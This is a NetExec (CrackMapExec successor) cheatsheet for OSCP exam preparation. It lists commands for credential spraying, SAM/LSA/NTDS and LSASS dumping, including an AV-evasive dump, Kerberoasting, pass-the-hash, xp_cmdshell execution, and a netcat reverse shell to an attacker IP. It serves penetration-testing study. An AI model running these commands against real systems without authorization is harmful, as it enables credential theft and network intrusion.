# 🔥 NetExec (NXC) Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> All commands tested with NetExec (successor to CrackMapExec)

---

## 📋 Table of Contents
- [Authentication](#-authentication)
- [Protocols](#-protocols)
- [Enumeration](#-enumeration)
- [Command Execution](#-command-execution)
- [Credential Dumping](#-credential-dumping)
- [Kerberos Attacks](#-kerberos-attacks)
- [File Operations](#-file-operations)
- [Useful Modules](#-useful-modules)
- [Pass The Hash](#-pass-the-hash)
- [MSSQL](#-mssql)
- [Output & Filtering](#-output--filtering)
- [Quick Decision Guide](#-quick-decision-guide)

---

## 🔑 Authentication

```bash
# Test creds - single target
nxc smb 192.168.1.1 -u user -p password

# Test creds - entire subnet
nxc smb 192.168.1.0/24 -u user -p password

# Pass the Hash
nxc smb 192.168.1.1 -u user -H NTLM_HASH

# Spray across subnet with hash
nxc smb 192.168.1.0/24 -u user -H NTLM_HASH

# Multiple users and passwords
nxc smb 192.168.1.1 -u users.txt -p passwords.txt

# Try user:pass pairs only (no bruteforce)
nxc smb 192.168.1.1 -u users.txt -p passwords.txt --no-bruteforce

# Null session
nxc smb 192.168.1.1 -u '' -p ''

# Guest session
nxc smb 192.168.1.1 -u guest -p ''

# Use Kerberos ticket
nxc smb 192.168.1.1 -u user --use-kcache

# Local auth (use --local-auth for local accounts)
nxc smb 192.168.1.1 -u administrator -p password --local-auth
```

---

## 🌐 Protocols

```bash
# SMB (port 445)
nxc smb 192.168.1.1 -u user -p password

# WinRM (port 5985/5986)
nxc winrm 192.168.1.1 -u user -p password

# MSSQL (port 1433)
nxc mssql 192.168.1.1 -u user -p password

# LDAP (port 389/636)
nxc ldap 192.168.1.1 -u user -p password

# RDP (port 3389)
nxc rdp 192.168.1.1 -u user -p password

# SSH (port 22)
nxc ssh 192.168.1.1 -u user -p password

# FTP (port 21)
nxc ftp 192.168.1.1 -u user -p password
```

---

## 🔍 Enumeration

```bash
# Domain users
nxc smb 192.168.1.1 -u user -p password --users

# Domain groups
nxc smb 192.168.1.1 -u user -p password --groups

# Domain password policy
nxc smb 192.168.1.1 -u user -p password --pass-pol

# Local users
nxc smb 192.168.1.1 -u user -p password --local-users

# Logged on users (requires admin)
nxc smb 192.168.1.1 -u user -p password --loggedon-users

# Active sessions
nxc smb 192.168.1.1 -u user -p password --sessions

# Shares
nxc smb 192.168.1.1 -u user -p password --shares

# Disks
nxc smb 192.168.1.1 -u user -p password --disks

# RID brute (enumerate users via RID cycling)
nxc smb 192.168.1.1 -u user -p password --rid-brute

# Computer accounts
nxc ldap 192.168.1.1 -u user -p password --computers

# Check SMB signing across subnet (for relay attacks)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## 💻 Command Execution

```bash
# Run CMD command
nxc smb 192.168.1.1 -u user -p password -x "whoami"

# Run PowerShell command
nxc smb 192.168.1.1 -u user -p password -X "Get-Process"

# Execute on multiple hosts at once
nxc smb 192.168.1.0/24 -u user -p password -x "whoami"

# Get reverse shell
nxc smb 192.168.1.1 -u user -p password -x "C:\Windows\Temp\nc.exe <ip> 9001 -e cmd.exe"
```

---

## 🗝️ Credential Dumping

```bash
# SAM dump (local account hashes)
nxc smb 192.168.1.1 -u user -p password --sam

# LSA secrets (service accounts, cached domain creds)
nxc smb 192.168.1.1 -u user -p password --lsa

# NTDS dump (DC only — dumps ALL domain hashes)
nxc smb 192.168.1.1 -u user -p password --ntds

# NTDS with history
nxc smb 192.168.1.1 -u user -p password --ntds --ntds-history

# lsassy (mimikatz-style dump — cleartext + hashes)
nxc smb 192.168.1.1 -u user -p password -M lsassy

# nanodump (AV evasive LSASS dump)
nxc smb 192.168.1.1 -u user -p password -M nanodump

# mimikatz module
nxc smb 192.168.1.1 -u user -p password -M mimikatz
```

> 💡 **Tip:** Run `--sam` first (fastest), then `-M lsassy` for domain creds/cleartext, then `--ntds` if you're on a DC.

---

## 🎫 Kerberos Attacks

```bash
# ASREPRoasting (find users without preauth)
nxc ldap 192.168.1.1 -u user -p password --asreproast asrep_hashes.txt

# Kerberoasting (find SPNs and request tickets)
nxc ldap 192.168.1.1 -u user -p password --kerberoasting kerb_hashes.txt

# Crack ASREPRoast hashes (hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack Kerberoast hashes (hashcat mode 13100)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# Use Kerberos ticket for auth
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb 192.168.1.1 -u user --use-kcache
```

---

## 📁 File Operations

```bash
# Upload file to target
nxc smb 192.168.1.1 -u user -p password --put-file ./local.exe \\Windows\\Temp\\remote.exe

# Download file from target
nxc smb 192.168.1.1 -u user -p password --get-file \\Windows\\Temp\\file.txt ./local.txt

# Spider shares (find interesting files)
nxc smb 192.168.1.1 -u user -p password -M spider_plus

# Spider and allow file download
nxc smb 192.168.1.1 -u user -p password -M spider_plus -o READ_ONLY=false
```

---

## 🧩 Useful Modules

```bash
# GPP Passwords (Group Policy Preferences — classic goldmine)
nxc smb 192.168.1.1 -u user -p password -M gpp_password
nxc smb 192.168.1.1 -u user -p password -M gpp_autologin

# Autologon credentials in registry
nxc smb 192.168.1.1 -u user -p password -M autologon

# LAPS passwords
nxc ldap 192.168.1.1 -u user -p password -M laps

# WebDAV check
nxc smb 192.168.1.1 -u user -p password -M webdav

# Print spooler check (PrinterBug)
nxc smb 192.168.1.1 -u user -p password -M spooler

# Zerologon vulnerability check
nxc smb 192.168.1.1 -u user -p password -M zerologon

# PetitPotam check
nxc smb 192.168.1.1 -u user -p password -M petitpotam

# NTLM info
nxc smb 192.168.1.1 -u user -p password -M ntlm-info
```

---

## 🔄 Pass The Hash

```bash
# PTH - single target
nxc smb 192.168.1.1 -u administrator -H NTLM_HASH

# PTH - full hash format (LM:NTLM)
nxc smb 192.168.1.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# PTH spray across subnet
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH

# PTH with local auth flag
nxc smb 192.168.1.1 -u administrator -H NTLM_HASH --local-auth

# PTH with Impacket (for shell)
impacket-psexec administrator@192.168.1.1 -hashes :NTLM_HASH
```

> 💡 **Tip:** The LM part `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash — just use `:NTLM_HASH` if you only have the NT hash.

---

## 🗄️ MSSQL

```bash
# Connect and test auth
nxc mssql 192.168.1.1 -u user -p password

# Windows auth
nxc mssql 192.168.1.1 -u user -p password -d domain --windows-auth

# Run SQL query
nxc mssql 192.168.1.1 -u user -p password -q "SELECT @@version"

# Enable xp_cmdshell
nxc mssql 192.168.1.1 -u user -p password -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE"
nxc mssql 192.168.1.1 -u user -p password -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"

# Execute OS command via xp_cmdshell
nxc mssql 192.168.1.1 -u user -p password -x "whoami"

# Connect with hash
nxc mssql 192.168.1.1 -u user -H NTLM_HASH --windows-auth
```

---

## 📤 Output & Filtering

```bash
# Only show successful authentications
nxc smb 192.168.1.0/24 -u user -p password | grep "+"

# Only show Pwn3d (admin access)
nxc smb 192.168.1.0/24 -u user -p password | grep "Pwn3d"

# Save output to file
nxc smb 192.168.1.0/24 -u user -p password | tee output.txt

# Verbose output
nxc smb 192.168.1.1 -u user -p password -v
```

---

## 🗺️ Quick Decision Guide

| Situation | Command |
|-----------|---------|
| Initial recon, no creds | `nxc smb <subnet> -u '' -p ''` |
| Have creds, check access | `nxc smb <subnet> -u user -p pass` |
| Got Pwn3d, dump local hashes | `--sam` |
| Got Pwn3d, dump cleartext/domain creds | `-M lsassy` |
| Got Pwn3d on DC | `--ntds` |
| Find interesting files on shares | `-M spider_plus` |
| Check for GPP creds | `-M gpp_password` |
| Kerberoast | `nxc ldap --kerberoasting` |
| ASREPRoast | `nxc ldap --asreproast` |
| Lateral movement with hash | `-H NTLM_HASH` across subnet |
| Need interactive shell | `evil-winrm` after WinRM Pwn3d |
| Find relay targets | `--gen-relay-list` |
| Check LAPS passwords | `nxc ldap -M laps` |

---

## 🚦 Understanding Pwn3d!

| Protocol | Pwn3d! Meaning | Next Step |
|----------|---------------|-----------|
| SMB | Local admin via SMB | Dump SAM/LSA/lsassy |
| WinRM | Can get shell | `evil-winrm -i <ip> -u user -p pass` |
| MSSQL | Sysadmin role | Enable xp_cmdshell |
| LDAP | Domain admin or high priv | DCSync / NTDS dump |

---

## ⚠️ OSCP Exam Notes

| Tool | Allowed? |
|------|---------|
| NetExec (nxc) | ✅ Yes |
| Impacket suite | ✅ Yes |
| BloodHound | ✅ Yes |
| Metasploit (1 machine only) | ⚠️ Limited |
| sqlmap | ❌ No |
| AutoSploit | ❌ No |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

*Generated for OSCP PEN-200 exam preparation*
